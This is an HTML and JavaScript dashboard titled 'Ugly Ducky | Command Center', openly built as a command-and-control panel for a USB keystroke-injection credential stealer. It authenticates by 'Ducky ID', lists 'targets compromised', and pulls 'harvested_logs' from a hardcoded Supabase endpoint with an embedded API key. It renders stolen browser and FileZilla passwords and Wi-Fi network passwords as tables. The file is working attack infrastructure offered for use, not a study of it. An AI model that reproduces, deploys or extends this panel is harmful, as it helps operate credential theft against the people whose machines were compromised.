<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ugly Ducky | Command Center</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: { sans: ['Inter', 'sans-serif'], mono: ['JetBrains Mono', 'monospace'], },
                    colors: { dark: '#0B0F19', panel: '#151C2C', neon: '#ff4757', neonHover: '#ff6b81' }
                }
            }
        }
    </script>
    <style>
        body { background-color: #0B0F19; color: #e2e8f0; }
        ::-webkit-scrollbar { width: 6px; } ::-webkit-scrollbar-track { background: #0B0F19; } ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #ff4757; }
        .glass-panel { background: rgba(21, 28, 44, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.05); }
        .fade-in { animation: fadeIn 0.4s ease-in-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .text-glow { text-shadow: 0 0 10px rgba(255, 71, 87, 0.5); }
        .view-section, .tab-content { display: none; }
        .view-section.active, .tab-content.active { display: block; animation: fadeIn 0.3s ease-in-out; }
    </style>
</head>
<body class="min-h-screen flex flex-col font-sans antialiased selection:bg-neon selection:text-white">

    <nav class="glass-panel border-b border-gray-800 sticky top-0 z-50 shadow-lg">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex items-center justify-between h-16">
                <div class="flex items-center gap-3 cursor-pointer" onclick="showView('view-auth')">
                    <i class="fa-solid fa-duck text-neon text-2xl text-glow"></i>
                    <span class="font-bold text-xl tracking-wider text-white uppercase">Ugly<span class="text-neon">Ducky</span></span>
                </div>
                <div id="activeDuckyBadge" class="hidden items-center gap-2 bg-gray-800 border border-gray-700 px-4 py-1.5 rounded-full text-sm font-mono">
                    <i class="fa-solid fa-key text-neon"></i>
                    Ducky ID: <span id="navDuckyId" class="text-white font-bold">---</span>
                    <button onclick="logout()" class="ml-2 text-gray-400 hover:text-neon transition-colors"><i class="fa-solid fa-right-from-bracket"></i></button>
                </div>
            </div>
        </div>
    </nav>

    <main class="flex-grow max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 w-full">
        
        <!-- VIEW 1: DUCKY ID AUTHENTICATION -->
        <div id="view-auth" class="view-section active">
            <div class="max-w-xl mx-auto mt-10">
                 <div class="text-center mb-8">
                    <h1 class="text-3xl md:text-4xl font-bold text-white mb-3">Command & <span class="text-neon text-glow">Control</span></h1>
                    <p class="text-gray-400">Authenticate with your Ducky ID to view its harvested logs.</p>
                </div>
                <div class="glass-panel p-6 rounded-2xl shadow-xl">
                    <label class="block text-sm font-semibold text-gray-300 mb-2 uppercase tracking-wide">Enter Ducky ID</label>
                    <div class="flex gap-3">
                        <div class="relative flex-grow">
                            <input type="text" id="duckyIdInput" placeholder="e.g. PICO-01" autocomplete="off" 
                                class="block w-full px-4 py-3 bg-[#0B0F19] border border-gray-700 rounded-lg text-white placeholder-gray-600 focus:outline-none focus:ring-2 focus:ring-neon focus:border-transparent transition-all font-mono text-lg">
                        </div>
                        <button onclick="loginWithDuckyId()" class="bg-neon hover:bg-neonHover text-white font-bold py-3 px-6 rounded-lg transition-all flex items-center gap-2 shadow-[0_0_15px_rgba(255,71,87,0.4)]">
                            <i class="fa-solid fa-arrow-right-to-bracket"></i> Connect
                        </button>
                    </div>
                    <p id="authStatusMsg" class="mt-3 text-sm text-gray-400"></p>
                </div>
            </div>
        </div>

        <!-- VIEW 2: FLEET OVERVIEW -->
        <div id="view-fleet" class="view-section">
             <div class="flex justify-between items-end mb-8 border-b border-gray-800 pb-4">
                <div>
                    <h1 class="text-3xl font-bold text-white mb-2">Target <span class="text-neon text-glow">Fleet</span></h1>
                    <p class="text-gray-400">Showing targets compromised by Ducky ID: <strong id="fleetDuckyId" class="text-neon"></strong></p>
                </div>
                <button onclick="loadFleet()" class="bg-[#1a2235] hover:bg-[#252f4a] border border-gray-700 text-white px-4 py-2 rounded-lg transition-all text-sm font-semibold"><i class="fa-solid fa-rotate-right mr-2"></i>Refresh</button>
            </div>
            <div id="fleetStatus" class="text-center py-10 text-gray-400 font-mono"></div>
            <div id="fleetGrid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>
        </div>
        
        <!-- VIEW 3: TARGET DASHBOARD -->
        <div id="view-target" class="view-section">
            <div class="flex justify-between items-center mb-8">
                 <button onclick="showView('view-fleet')" class="text-gray-400 hover:text-white transition-colors"><i class="fa-solid fa-arrow-left mr-2"></i>Back to Fleet</button>
                 <div class="text-right">
                    <h2 id="targetIdHeader" class="text-xl font-bold font-mono text-white"></h2>
                    <p class="text-sm text-gray-500">Viewing logs for selected target</p>
                 </div>
            </div>
            <div id="filterContainer" class="max-w-7xl mx-auto mb-6 flex flex-wrap gap-2 justify-center border-b border-gray-800 pb-6 hidden"></div>
            <div id="targetStatus" class="text-center py-10 text-gray-400 font-mono hidden"></div>
            <div id="output" class="grid grid-cols-1 lg:grid-cols-2 gap-6 pb-20"></div>
        </div>
    </main>

    <script>
        const SUPABASE_URL = "https://azonyysxbizkykdowsma.supabase.co/rest/v1/harvested_logs";
        const SUPABASE_KEY = "sb_publishable_-LlPFHiz2oLK4jhP6tIwOw_88BiAcIg";
        let currentDuckyId = ""; let targetLogs = [];

        document.getElementById("duckyIdInput").addEventListener("keypress", e => { if (e.key === "Enter") loginWithDuckyId(); });

        function showView(viewId) { document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active')); document.getElementById(viewId).classList.add('active'); }
        function logout() { currentDuckyId = ""; document.getElementById('activeDuckyBadge').classList.add('hidden'); showView('view-auth'); }
        
        async function loginWithDuckyId() {
            const id = document.getElementById('duckyIdInput').value.trim();
            const status = document.getElementById('authStatusMsg');
            if (!id) { status.innerText = "Please enter a Ducky ID."; return; }
            currentDuckyId = id;
            document.getElementById('navDuckyId').innerText = currentDuckyId;
            document.getElementById('fleetDuckyId').innerText = currentDuckyId;
            document.getElementById('activeDuckyBadge').classList.remove('hidden');
            document.getElementById('activeDuckyBadge').classList.add('flex');
            showView('view-fleet');
            loadFleet();
        }

        async function loadFleet() {
            const grid = document.getElementById('fleetGrid');
            const status = document.getElementById('fleetStatus');
            grid.innerHTML = ''; status.innerHTML = '<i class="fa-solid fa-satellite-dish fa-spin text-neon"></i> Scanning for targets...';

            try {
                const response = await fetch(`${SUPABASE_URL}?select=device_id,created_at&device_id=like.${currentDuckyId}-*&order=created_at.desc&limit=2000`, { headers: { 'apikey': SUPABASE_KEY }});
                if (!response.ok) throw new Error("API Error");
                const data = await response.json();

                const fleetMap = data.reduce((acc, row) => {
                    if (!acc[row.device_id]) acc[row.device_id] = { id: row.device_id, lastSeen: row.created_at, logsCount: 0 };
                    acc[row.device_id].logsCount++;
                    return acc;
                }, {});

                const targets = Object.values(fleetMap);
                status.innerHTML = '';
                if (targets.length === 0) { grid.innerHTML = '<div class="col-span-full text-center text-gray-500 py-10">No targets found for this Ducky ID.</div>'; return; }

                targets.forEach((target, i) => {
                    const card = document.createElement('div');
                    card.className = "glass-panel p-5 rounded-xl hover:border-neon transition-all cursor-pointer group fade-in";
                    card.style.animationDelay = `${i * 0.05}s`; card.onclick = () => selectTarget(target.id);
                    card.innerHTML = `<h3 class="text-lg font-bold text-white font-mono mb-1 truncate" title="${target.id}">${target.id.replace(currentDuckyId + '-', '')}</h3>
                                      <p class="text-sm text-gray-400 mb-3"><i class="fa-solid fa-database text-gray-500"></i> ${target.logsCount} Logs</p>
                                      <div class="text-xs text-gray-500 border-t border-gray-800 pt-2">Last Seen: ${new Date(target.lastSeen).toLocaleString()}</div>`;
                    grid.appendChild(card);
                });
            } catch (err) { status.innerHTML = '<i class="fa-solid fa-triangle-exclamation text-red-500 mr-2"></i> Failed to connect to DB.'; }
        }

        function selectTarget(id) {
            document.getElementById('targetIdHeader').innerText = id.replace(currentDuckyId + '-', '');
            showView('view-target'); fetchTargetData(id);
        }

        async function fetchTargetData(id) {
            const outputDiv = document.getElementById('output'); const statusDiv = document.getElementById('targetStatus'); const filterContainer = document.getElementById('filterContainer');
            outputDiv.innerHTML = ''; filterContainer.classList.add('hidden'); statusDiv.classList.remove('hidden'); statusDiv.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-neon"></i> Fetching logs...';

            try {
                const response = await fetch(`${SUPABASE_URL}?device_id=eq.${id}&order=created_at.desc`, { headers: { 'apikey': SUPABASE_KEY }});
                targetLogs = await response.json(); statusDiv.classList.add('hidden');
                if(targetLogs.length > 0) { buildFilters(); renderCards(targetLogs); }
                 else { outputDiv.innerHTML = '<div class="col-span-full text-center text-gray-500">No logs found.</div>'; }
            } catch (err) { statusDiv.innerHTML = '<i class="fa-solid fa-xmark text-red-500 mr-2"></i> Failed to fetch logs.'; }
        }

        function buildFilters() {
            const container = document.getElementById('filterContainer'); container.innerHTML = ''; container.classList.remove('hidden');
            const categories = [...new Set(targetLogs.map(item => item.category))];
            const createBtn = (text, isActive) => {
                const btn = document.createElement('button');
                btn.className = `px-4 py-2 rounded-full border text-sm transition-all duration-200 filter-btn ${isActive ? 'bg-neon text-white font-bold border-neon' : 'bg-panel text-gray-400 border-gray-700 hover:text-white'}`;
                btn.innerText = text;
                btn.onclick = () => { document.querySelectorAll('.filter-btn').forEach(b => b.className = b.className.replace('bg-neon text-white font-bold border-neon', 'bg-panel text-gray-400 border-gray-700 hover:text-white')); btn.className = btn.className.replace('bg-panel text-gray-400 border-gray-700 hover:text-white', 'bg-neon text-white font-bold border-neon'); renderCards(text === 'All' ? targetLogs : targetLogs.filter(item => item.category === text)); };
                return btn;
            };
            container.appendChild(createBtn('All', true)); categories.forEach(cat => container.appendChild(createBtn(cat, false)));
        }

        function renderCards(data) {
            const outputDiv = document.getElementById('output'); outputDiv.innerHTML = '';
            data.forEach((item, index) => {
                const card = document.createElement('div');
                card.className = "glass-panel rounded-xl overflow-hidden fade-in flex flex-col h-full"; card.style.animationDelay = `${index * 0.05}s`;
                card.innerHTML = `<div class="p-4 border-b border-gray-800 bg-[#1a2235]"><h3 class="font-bold text-white uppercase tracking-wider text-sm">${item.category}</h3></div>
                                  <div class="p-0 flex-grow bg-[#0f1423] max-h-[350px] overflow-y-auto">${parseToHTML(item.category, item.content)}</div>`;
                outputDiv.appendChild(card);
            });
        }
        
        function parseToHTML(category, content) {
            const escape = s => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
            const defaultRaw = `<pre class="p-4 font-mono text-xs text-gray-300 whitespace-pre-wrap">${escape(content)}</pre>`;
            try {
                const blocks = content.split(/-{10,}/).filter(b => b.trim());
                if (category.includes('Password') || category.includes('Cred') || category.includes('FileZilla')) {
                    const rows = blocks.map(b => {
                        let url = (b.match(/(?:URL|HOST|TARGET):\s*(.*)/i) || [])[1] || 'N/A';
                        let user = (b.match(/USER:\s*(.*)/i) || [])[1] || 'N/A';
                        let pass = (b.match(/PASS:\s*(.*)/i) || [])[1] || 'N/A';
                        return `<tr class="border-b border-gray-800"><td class="px-4 py-3 text-neon truncate max-w-[120px]">${escape(url)}</td><td class="px-4 py-3 truncate max-w-[100px]">${escape(user)}</td><td class="px-4 py-3 font-mono">${escape(pass)}</td></tr>`;
                    }).join('');
                    return `<table class="w-full text-left text-sm table-fixed"><thead class="bg-[#0B0F19] text-gray-500 uppercase text-xs"><tr><th class="px-4 py-2">Target</th><th class="px-4 py-2">Username</th><th class="px-4 py-2">Password</th></tr></thead><tbody>${rows}</tbody></table>`;
                }
                // *** NEW WIFI PARSER ***
                if (category.includes('Wi-Fi')) {
                     const rows = blocks.map(b => {
                        let ssid = (b.match(/SSID:\s*(.*)/i) || [])[1] || 'N/A';
                        let pass = (b.match(/PASS:\s*(.*)/i) || [])[1] || 'N/A';
                        return `<tr class="border-b border-gray-800"><td class="px-4 py-3 text-neon">${escape(ssid)}</td><td class="px-4 py-3 font-mono">${escape(pass)}</td></tr>`;
                    }).join('');
                    return `<table class="w-full text-left text-sm"><thead class="bg-[#0B0F19] text-gray-500 uppercase text-xs"><tr><th class="px-4 py-2 w-1/2">SSID (Network Name)</th><th class="px-4 py-2 w-1/2">Password</th></tr></thead><tbody>${rows}</tbody></table>`;
                }
            } catch (e) { return defaultRaw; } return defaultRaw;
        }
    </script>
</body>
</html>
